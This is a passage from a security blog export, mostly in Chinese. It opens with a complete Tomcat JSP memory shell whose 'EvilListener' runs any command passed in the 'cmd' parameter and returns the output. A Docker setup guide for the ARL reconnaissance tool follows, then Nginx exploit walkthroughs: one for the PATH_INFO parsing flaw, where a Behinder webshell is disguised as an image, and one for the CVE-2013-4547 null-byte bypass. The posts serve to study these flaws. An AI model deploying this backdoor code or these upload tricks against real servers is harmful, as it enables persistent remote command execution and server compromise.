<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">Field stdFiled=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">aplContext</span> <span class="operator">=</span> (ApplicationContext) stdFiled.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">standardFld</span> <span class="operator">=</span> aplContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardFld.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardFld.get(aplContext);</span><br><span class="line"></span><br><span class="line">List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());</span><br><span class="line">List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(applicationEventListeners);</span><br><span class="line">arrayList.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">TestListener</span>());</span><br><span class="line">standardContext.setApplicationEventListeners(arrayList.toArray());</span><br></pre></td></tr></table></figure>

<h1 id="构造恶意内存马"><a href="#构造恶意内存马" class="headerlink" title="构造恶意内存马"></a>构造恶意内存马</h1><p>构造内存马，直接把上面的注册过程写到jsp页面，然后在jsp页面写一个<code>&lt;%! 方法%&gt;</code>就可以了。</p>
<p>需要注意的是，重写的<code>ServletRequestListener</code>的类方法<code>public void requestInitialized(ServletRequestEvent servletRequestEvent)</code>中，只有参数<code>servletRequestEvent</code>，而没有response。 如果我们想使用内存马，最好是能够有回显。</p>
<p>在<strong>Request</strong>类中，我们可以得到response，而Request类是<strong>RequestFacade</strong>类中的属性<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165853415.png" alt="image-20211229165853415"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211229165807812.png" alt="image-20211229165807812"></p>
<p>只要能够得到RequestFacade中的request属性，就能得到response object，所以我们直接用反射的方法来完成。</p>
<p><strong>完整构造</strong>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Arrays&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: leihehe</span><br><span class="line">  Date: <span class="number">29</span>/<span class="number">12</span>/<span class="number">2021</span></span><br><span class="line">  Time: <span class="number">15</span>:<span class="number">52</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> servletRequestEvent.getServletRequest();</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) servletRequest;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> requestFacade.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestField.get(requestFacade);</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="keyword">while</span> ((i=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    request.getResponse().getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,i));</span><br><span class="line">                    request.getResponse().getWriter().write(<span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | NoSuchFieldException | IllegalAccessException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    Field stdFiled=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">aplContext</span> <span class="operator">=</span> (ApplicationContext) stdFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardFld</span> <span class="operator">=</span> aplContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardFld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardFld.get(aplContext);</span><br><span class="line"></span><br><span class="line">    List&lt;Object&gt; applicationEventListeners = Arrays.asList(standardContext.getApplicationEventListeners());</span><br><span class="line">    List&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(applicationEventListeners);</span><br><span class="line">    arrayList.add(<span class="number">0</span>,<span class="keyword">new</span> <span class="title class_">EvilListener</span>());</span><br><span class="line">    standardContext.setApplicationEventListeners(arrayList.toArray());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_31772441/article/details/80095037">调用list.add方法报错（java.lang.UnsupportedOperationException）</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Java Memory Shell</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Java Memory Shell</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全之ARL灯塔搭建</title>
    <url>/2021/06/01/arlSetup/</url>
    <content><![CDATA[<h1 id="How-do-you-set-up-ARL"><a href="#How-do-you-set-up-ARL" class="headerlink" title="How do you set up ARL?"></a>How do you set up ARL?</h1><p>详细参考：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p>
<h2 id="Preparation-服务器购买"><a href="#Preparation-服务器购买" class="headerlink" title="Preparation: 服务器购买"></a>Preparation: 服务器购买</h2><p>因为ARL是搭建在LINUX系统上，我的MAC内存又不够，加上想要ARL全天24小时运作，所以决定搭建在远程服务器上。</p>
<p>这里我选择了<a href="https://console.cloud.tencent.com/">腾讯云</a>, 系统为Ubuntu 64</p>
<p>选择生成ssh私钥，并绑定到主机上，登录时用生成的密码文件登陆即可</p>
<p><a href="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p>
<span id="more"></span>

<h2 id="Install-Docker-on-Ubuntu"><a href="#Install-Docker-on-Ubuntu" class="headerlink" title="Install Docker on Ubuntu"></a>Install Docker on Ubuntu</h2><p>第一步：如果有安装过Docker旧版本，需要先卸载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>

<p>第二步：设置docker仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更新 apt package index</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载 package</span></span><br><span class="line">sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加docker的官方gpg key</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建立稳定的仓库</span></span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></pre></td></tr></table></figure>

<p>第三步：安装Docker引擎</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>

<p>最后测试docker环境是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<p><img src="/image/arlSetup/image-20210601225207466.png" alt="image-20210601225207466"></p>
<h2 id="Install-Docker-Compose"><a href="#Install-Docker-Compose" class="headerlink" title="Install Docker Compose"></a>Install Docker Compose</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先在https://github.com/docker/compose/releases 查看最新版本，当前版本为1.29.2</span></span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/1.29.2/docker-compose-`<span class="built_in">uname</span> -s`-`<span class="built_in">uname</span> -m` -o /usr/local/bin/docker-compose</span><br><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="comment">#最后查看是否安装成功</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>

<p><img src="/image/arlSetup/image-20210602132156940.png" alt="image-20210602132156940"></p>
<h2 id="Install-ARL"><a href="#Install-ARL" class="headerlink" title="Install ARL"></a>Install ARL</h2><p>手动下载ARL最新版本：<a href="https://github.com/TophantTechnology/ARL/releases">https://github.com/TophantTechnology/ARL/releases</a></p>
<p><img src="/image/arlSetup/image-20210602132458529.png" alt="image-20210602132458529"></p>
<p>将下载好的压缩包在本地解压，文件名为docker_arl</p>
<p><img src="/image/arlSetup/image-20210602133905785.png" alt="image-20210602133905785"></p>
<p>然后用sftp传送文件到服务器上，这里我用的是==mac版的FileZilla== </p>
<p><img src="/image/arlSetup/image-20210602134851037.png" alt="image-20210602134851037"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建容器数据卷 </span></span><br><span class="line">sudo docker volume create --name=arl_db *</span><br><span class="line"><span class="comment"># 进入上传的目录</span></span><br><span class="line"><span class="built_in">cd</span> /home/docker_arl </span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><img src="/image/arlSetup/image-20210602140011363.png" alt="image-20210602140011363"></p>
<p><strong>补充：在使用docker和docker-compose的时候，必须要root权限，所以前面需要加上sudo，若想直接用root用户登陆 可参考 <a href="https://cloud.tencent.com/developer/article/1405735">腾讯云ubuntu系统改为root登录</a></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#看docker-compose是否运行正常</span></span><br><span class="line">sudo docker-compose ps</span><br></pre></td></tr></table></figure>

<p><img src="/image/arlSetup/image-20210602140410197.png" alt="image-20210602140410197"></p>
<h2 id="登录搭建好的ARL灯塔系统"><a href="#登录搭建好的ARL灯塔系统" class="headerlink" title="登录搭建好的ARL灯塔系统"></a>登录搭建好的ARL灯塔系统</h2><p>https://你的服务器外网ip:5003/</p>
<p>这里我用Chrome访问，但是会提示连接不是private的<img src="/image/arlSetup/image-20210602142031252.png" alt="image-20210602142031252"></p>
<p>于是我换了safari，依然提示连接不是private，但可以继续访问</p>
<p><img src="/image/arlSetup/image-20210602142133895.png" alt="image-20210602142133895"></p>
<p><code>默认账号:admin 密码:arlpass</code></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Information Gathering</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Information Gathering</tag>
        <tag>ARL</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx漏洞复现系列</title>
    <url>/2021/07/20/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在漏洞复现的过程中，我并不想单纯地复现漏洞，而是想要找出漏洞成因和原理，不想当一个脚本小子。</p>
<p>我在了解这些漏洞的过程中，发现国内的很多文章中漏洞原理和成因都解释得不清不楚，想要完全搞清楚一个漏洞的成因十分困难，有时甚至花上一天去研究一个漏洞的成因，于是我决定将我所理解的知识点详细记录下来。</p>
<h1 id="Nginx介绍"><a href="#Nginx介绍" class="headerlink" title="Nginx介绍"></a>Nginx介绍</h1><blockquote>
<p>Nginx(engine X)是一款轻量级的Web服务器、反向代理服务器，由于它的内存占用少，启动极快，高并发能力强，在互联网项目中广泛应用。</p>
</blockquote>
<p>简单来说，<strong>代理</strong>就像一个中介。</p>
<p>我们借助VPN来访问一些网站，而VPN就是一个<strong>正向代理</strong>的例子。我们向VPN发送请求，VPN再把我们的请求发送给目标服务器，而<strong>目标服务器并不知道我们真实的IP地址</strong>，只知道与他交互的人（正向代理服务器）。所以可知<strong>正向代理是代理客户端（我们）的</strong>。</p>
<p>而<strong>反向代理</strong>中，代理是<strong>代理服务端</strong>的。我们客户端不需要进行任何配置，即可发送请求给对方网站，发送的请求会通过<strong>反代理服务器</strong>，然后反代理服务器再把请求传给最终的目标服务器，最后返回给客户端，而<strong>我们是不知道真实的目标服务器IP地址的</strong>。所以可知，<strong>反向代理代理目标服务器</strong>。</p>
<span id="more"></span>

<h1 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>该漏洞与<code>nginx</code>、<code>php</code>版本无关，是用户配置不当造成的漏洞。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="什么是CGI"><a href="#什么是CGI" class="headerlink" title="什么是CGI"></a>什么是CGI</h3><blockquote>
<p>CGI是外部应用程序与WEB服务器之间的接口标准。CGI规范允许Web服务器执行外部程序，并将它们的输出发送给Web浏览器，CGI将Web的一组简单的静态超媒体文档变成一个完整的新的交互式媒体。</p>
</blockquote>
<p>那么我们就把他理解成是WEB服务器与程序之间的一种接口就好了。</p>
<h3 id="Fastcgi、Nginx和PHP解析器的关系"><a href="#Fastcgi、Nginx和PHP解析器的关系" class="headerlink" title="Fastcgi、Nginx和PHP解析器的关系"></a>Fastcgi、Nginx和PHP解析器的关系</h3><p>首先，<code>fastcgi</code>是一种协议，全称 快速通用网关接口<code>（FastCommonGatewayInterface）</code>，是升级版的CGI。</p>
<p>这里我们只需要了解他们的运作流程。</p>
<p>如果<code>web server（nginx）</code>收到请求<code>/index.php</code>后，会开始查找文件，知道这不是一个静态文件后，需要找<code>PHP</code>解析器来处理，而在交给<code>PHP</code>解析器处理之前，需要<code>fastcgi</code>来规定传什么数据或什么格式给<code>PHP</code>解析器，之后PHP解析器会解析<code>php.ini</code>，处理请求，处理后把结果返回给浏览器。</p>
<h3 id="PATH-INFO和SCRIPT-FILENAME"><a href="#PATH-INFO和SCRIPT-FILENAME" class="headerlink" title="PATH_INFO和SCRIPT_FILENAME"></a>PATH_INFO和SCRIPT_FILENAME</h3><p>我们刚刚说到了<code>fastcgi</code>、<code>Nginx</code>和<code>PHP</code>解析器的关系，那么现在来说下漏洞涉及到的配置。</p>
<p><strong>什么是PATH_INFO？</strong></p>
<p>举一个例子，当你访问网址<code>/hello.php/id/123</code>的时候，<code>/id/123</code>便是你的<code>PATH_INFO</code></p>
<p><strong>什么是SCRIPT_FILENAME</strong></p>
<p>在<code>fastcgi</code>中的一个参数。当你访问网址<code>/hello.php/id/123</code>的时候，<code>/hello.php</code>便是你的<code>SCRIPT_FILENAME</code>，即执行脚本的绝对路径。</p>
<blockquote>
<p>转换成 PHP 中的变量就是 <code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> ，PHP 参考手册中对 <code>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</code> 参数说明为当前执行脚本的绝对路径。</p>
</blockquote>
<p><strong>漏洞成因</strong></p>
<p>在<code>nginx/default.conf</code>的配置文件中<code>.php</code>后缀名的路径会交由<code>fastcgi</code>协议的<code>php</code>解析器处理。</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722142211210.png" alt="image-20210722142211210"></p>
<p>当我们访问<code>/shell.png/aaa.php</code>时，<strong>nginx</strong>不会对<code>aaa.php</code>是否存在进行检查，而是直接将路径提交给<code>fastcgi</code>，并将<code>fastcgi</code>的<code>SCRIPT_FILENAME</code>设为<code>/shell.png/aaa.php</code>（上面有讲过该参数怎么得来的）</p>
<p>接着<code>fastcgi</code>将这个参数<code>SCRIPT_FILENAME</code>传给<code>php</code>解析器<code>(php-fpm)</code></p>
<p>这时候，<code>PHP</code>解析器收到了这个<code>SCRIPT_FILENAME</code>，但它发现<code>aaa.php</code>并不存在，怎么办呢？</p>
<p>因为我们配置了<code>cgi.fix_pathinfo=1</code>，所以<code>php</code>会修正传过来的这个<code>SCRIPT_FILENAME</code>，认为<strong>脚本执行的绝对路径</strong>不应该是<code>/shell.png/aaa.php</code>而是存在的文件<code>/shell.png</code>（他会根据提供的路径一直往上级目录找，直到找到存在的文件，但寻找到后他也不会判断找到的文件的后缀格式），同时<code>PATH_INFO</code>应该是<code>/aaa.php</code></p>
<p>所以我们所提交的<code>/shell.png/aaa.php</code>请求，会被错误解析，从而引发安全漏洞 -&gt; <code>PHP</code>解析器会去解析非<code>PHP</code>格式的<code>shell.png</code>，而把<code>/aaa.php</code>当作<code>PATH_INFO</code></p>
<p>换句话说，<code>PHP</code>解析器认为该执行的脚本是<code>shell.png</code>，而后面的路径只是<code>PATH_INFO</code>而已。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>准备一个冰蝎的PHP马，后缀改为<code>jpg</code>格式，然后直接上传，发现提示<img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722150828954.png" alt="image-20210722150828954"></p>
<p>猜测是因为要检测文件头（具体没有研究），于是我重新上传一张正常的<code>png</code>图，用<code>burp suite</code>抓包修改</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151008554.png" alt="image-20210722151008554"></p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151106496.png" alt="image-20210722151106496"></p>
<p>发送后得到地址<img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151134510.png" alt="image-20210722151134510"></p>
<p>访问：<img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151207147.png" alt="image-20210722151207147"></p>
<p>已被解析为<code>php</code>文件，上冰蝎，成功：</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722151257093.png" alt="image-20210722151257093"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://serverfault.com/questions/627903/is-the-php-option-cgi-fix-pathinfo-really-dangerous-with-nginx-php-fpm">Is the PHP option cgi-fix-pathinfo really dangerous with Nginx+PHP-FPM</a></p>
<p><a href="https://www.laruence.com/2009/11/13/1138.html">Nginx(PHP/fastcgi)的PATH_INFO问题</a></p>
<p><a href="https://www.laruence.com/2010/05/20/1495.html">Nginx + PHP CGI的一个可能的安全漏洞</a></p>
<p><a href="https://www.vvave.net/archives/in-depth-understand-of-php-projects-about-pathinfo-usage.html">深入理解 PHP 项目关于 PATHINFO 使用问题</a></p>
<h1 id="Nginx-文件名逻辑漏洞（CVE-2013-4547）"><a href="#Nginx-文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="Nginx 文件名逻辑漏洞（CVE-2013-4547）"></a>Nginx 文件名逻辑漏洞（CVE-2013-4547）</h1><h2 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p>
<p>错误地解析了用户请求，检测URI时的逻辑错误导致用户可以绕过对截断符<code>%00</code>的检测，从而形成漏洞。</p>
<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722230026675.png" alt="image-20210722230026675"></p>
<p>从Nginx的配置文件中，我们可以看到，<code>php</code>后缀的文件被交给了<code>fastcgi</code>处理。<a name="Fastcgi、Nginx和PHP解析器的关系">fastcgi、Nginx和PHP解析器的关系</a> 在之前的解析漏洞有提到。</p>
<p>假设我们尝试访问一个图片，访问的网址是<code>/test.png \0.php</code>, nginx收到访问请求，开始判断这个是什么文件。<code>nginx</code>会先检测<code>URI</code>，发现在检测<code>uri</code>的时候，<code>nginx</code>会做如下检测：开始一个字节一个字节的检测，检测到<code>\0</code>的时候会判断其为非法字符。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> sw_check_uri:      </span><br><span class="line">   ……</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>: </span><br><span class="line">           r-&amp;gt;complex_uri = <span class="number">1</span>;  <span class="comment">//此作为flag会判断使用ngx_http_parse_complex_uri方法，对路径修复</span></span><br><span class="line">           state = sw_uri; </span><br><span class="line">           <span class="keyword">break</span>;    </span><br><span class="line">   ……</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:   <span class="comment">//当遇到\0时，将会判断为非法字符</span></span><br><span class="line">           <span class="keyword">return</span> NGX_HTTP_PARSE_INVALID_REQUEST;</span><br></pre></td></tr></table></figure>

<p>但代码中还有一层逻辑，就是当检测到有空格的时候，会执行到另一部分代码 <code>sw_check_uri_http_09</code>中：这时候的<code>ch</code>变成了我们的截断符<code>%00</code>，这里没有满足它的<code>case</code>，所以他将执行最后一段<code>default</code>代码，即返回到<code>sw_check_uri</code>中，这样<code>\0</code>就并未检测到，也不会被判断为<strong>非法字符</strong>。</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722232400410.png" alt="image-20210722232400410"></p>
<p>此时<code>ch</code>又变成了下一个字符<code>.</code>，之后被判断为<code>PHP</code>文件，该请求被交给了<code>fastcgi</code>处理，<code>fastcgi</code>被<code>\0</code>截断字符截断，所以最终交给<code>PHP</code>解析器解析的地址是<code>/test.png[空格]</code>，因此<code>test[空格].png</code>将被解析为<code>PHP</code>类。</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>为了让截断符号不被检测到，我们需要用空格绕过检测，而空格应该在截断符号之前。需要注意的是，在windows环境下，空格是会被自动去掉的，而Linux是不可以去掉的。而我们的目标环境是<code>Linux</code>，所以我们必须上传带有空格的图片，这样<code>PHP解析器</code>才能找到这个文件，如果是<code>Windows</code>，就不用带空格。</p>
<p>先用<code>burp suite</code>抓包修改上传一个含木马的图片<code>test.png[空格] </code>，</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210723000546878.png" alt="image-20210723000546878"></p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210723000742595.png" alt="image-20210723000742595">这里我以<code>phpinfo()</code>作为检测。</p>
<p>上传后得到地址</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722234129588.png" alt="image-20210722234129588"></p>
<p>访问文件<code>test.png1</code>, 再次用<code>burp suite</code>抓包修改。这里说下为什么要访问<code>png1</code> - 我尝试过，直接访问<code>test.png</code>的话，<code>burp suite</code>是抓不到包的。</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722234425902.png" alt="image-20210722234425902"></p>
<p>修改GET路径为<code>/uploadfiles/test.png[空格][空格].png</code>，然后选中第二个空格修改hex值为<strong>00</strong>（截断符的意思）</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210722234823479.png" alt="image-20210722234823479"></p>
<p>修改完毕后再发送请求。</p>
<p><img src="/image/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210723000838302.png" alt="image-20210723000838302"></p>
<p>漏洞利用成功。</p>
<h2 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/cj_Allen/article/details/109473363">【漏洞复现】Nginx 文件名逻辑漏洞（CVE-2013-4547）</a></p>
<p><a href="http://www.91ri.org/9064.html">CVE-2013-4547 Nginx解析漏洞深入利用及分析</a></p>
<h1 id="Nginx-目录穿越漏洞"><a href="#Nginx-目录穿越漏洞" class="headerlink" title="Nginx 目录穿越漏洞"></a>Nginx 目录穿越漏洞</h1><h2 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>该漏洞是用户配置不当造成的。</p>
<h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在分析漏洞原理之前，这里我们先讲一下<code>nginx</code>配置文件中<code>alias</code>和<code>root</code>的定义</p>
<p><code>alias</code>是目录别名</p>
<p><code>root</code>是最上层目录</p>
<p><strong>root</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location /hello/ &#123;</span><br><span class="line">    root /var/www/image</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 若按照上述配置的话，访问/hello目录里面的文件时, nginx会自动去/var/www/image/hello去找</span></span><br></pre></td></tr></table></figure>

<p> <strong>alias</strong></p>
